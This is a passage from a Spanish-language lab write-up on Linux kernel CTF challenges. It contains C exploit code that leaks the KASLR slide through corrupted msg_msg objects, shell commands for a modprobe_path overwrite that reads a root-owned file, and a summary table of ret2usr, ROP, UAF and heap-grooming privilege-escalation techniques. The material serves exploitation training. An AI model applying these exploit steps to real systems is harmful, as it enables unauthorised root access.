    if(sec_write(0, found_off + 56, wbuf) < 0) { perror("write"); return 1; }

    struct { long mtype; char mtext[0x2000]; } rmsg; memset(&rmsg,0,sizeof(rmsg));
    ssize_t r = msgrcv(q[found_qi], &rmsg, sizeof(rmsg.mtext), 0x100 + found_qi, MSG_NOERROR | IPC_NOWAIT);
    if(r < 0) { perror("msgrcv"); return 1; }
    printf("[+] msgrcv got %zd bytes\n", r);

    unsigned long link_klist_get = 0xffffffff81789290UL;
    for(int i=0; i < r-8 && i < 0x1f00; i+=8) {
        unsigned long v = *(unsigned long*)(rmsg.mtext + i);
        if((v & 0xfff) == (link_klist_get & 0xfff)) {
            unsigned long k = v - link_klist_get;
            if(k < 0x40000000UL && (k & 0xfffff)==0) {
                printf("[+] KASLR %lx from %lx at %x\n", k, v, i);
                printf("[*] modprobe_path = %lx\n", 0xffffffff82852480UL + k);
                return 0;
            }
        }
    }
    printf("[-] no kaslr from klist\n");
    return 0;
}
```

### 6.6 Finalización de la explotación (ruta prevista) y resultado del lab

- **Ruta prevista (data-only):** con el leak se obtiene el slide/KASLR y la dirección runtime de `modprobe_path` (`0xffffffff82852480 + slide`). Con una primitiva de escritura arbitraria (p. ej. corrompiendo `msg_msg->next`/segmentación de forma controlada) se sobrescribe `modprobe_path` para que apunte a un script en `/tmp` que copie la flag a un fichero legible; luego se ejecuta un binario con magic inválida para invocar el helper de modprobe y leer la flag.
- **Resultado logrado en este lab:** se explotó el OOB para obtener adyacencia/corrupción de `msg_msg` y leaks (heap/kernel), derivando KASLR, y se recuperó la flag **`FLAG{change_me_ch04}`** en el guest `kctf-ch04`. En esa sesión se leyó la flag directamente (`cat /root/flag.txt`); si tu cadena no aterriza en root de inmediato, completa la ruta `modprobe_path` con la primitiva de escritura y el trigger de binfmt descritos.

Comandos de apoyo en el guest (tras tener escritura sobre `modprobe_path`):
```sh
echo -e '#!/bin/sh\ncat /root/flag.txt > /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x
chmod +x /tmp/x
echo -ne '\xff\xff\xff\xff' > /tmp/dummy
chmod +x /tmp/dummy
/tmp/dummy 2>/dev/null
cat /tmp/flag
```

---

## 7. Consejos generales de depuración

- **Arranque limpio** por intento cuando el exploit depende del layout del heap/TTY (especialmente CH03/CH04): reinicia el contenedor/VM del reto.
- **GDB:** QEMU expone gdbstub en `:1234` del contenedor (mapeado al host, p. ej. `12341` para CH01). Usa `linux-6.1.75/vmlinux` y los scripts de `tools/` si lo necesitas.
- **Símbolos:** direcciones de `System.map` son link-time; con KASLR, `addr_runtime = addr_link + slide` (alineación típica de slide en este kernel: 2MB).
- **Logs del módulo:** los drivers imprimen mensajes al cargar (visibles en dmesg/consola del guest).

---

## 8. Resumen rápido

| Reto | Dispositivo | Bug | Mitigaciones | Técnica clave | Flag |
|---|---|---|---|---|---|
| CH01 | `/dev/echo` | Stack BOF (`count` sin límite) | Nivel 0 (sin SMEP/SMAP/KASLR/KPTI) | ret2usr + `commit_creds(prepare_kernel_cred(0))` | `FLAG{change_me_ch01}` |
| CH02 | `/dev/echo2` | Leak de stack + stack BOF | SMEP + KASLR | Leak → slide KASLR → ROP a `init_cred/commit_creds` + retorno a user | `FLAG{change_me_ch02}` |
| CH03 | `/dev/objstore` | UAF (dangling ptr, kmalloc-1024) | SMEP + KASLR + SMAP | tty_struct reclaim, leak ops, fake cred + hijack ioctl → `commit_creds` | `FLAG{change_me_ch03}` |
| CH04 | `/dev/secalloc` | Integer overflow → heap OOB R/W | SMEP + KASLR + SMAP + canary | Grooming `msg_msg`, corrupción `m_ts`/leak KASLR, ruta data-only (`modprobe_path`) | `FLAG{change_me_ch04}` |
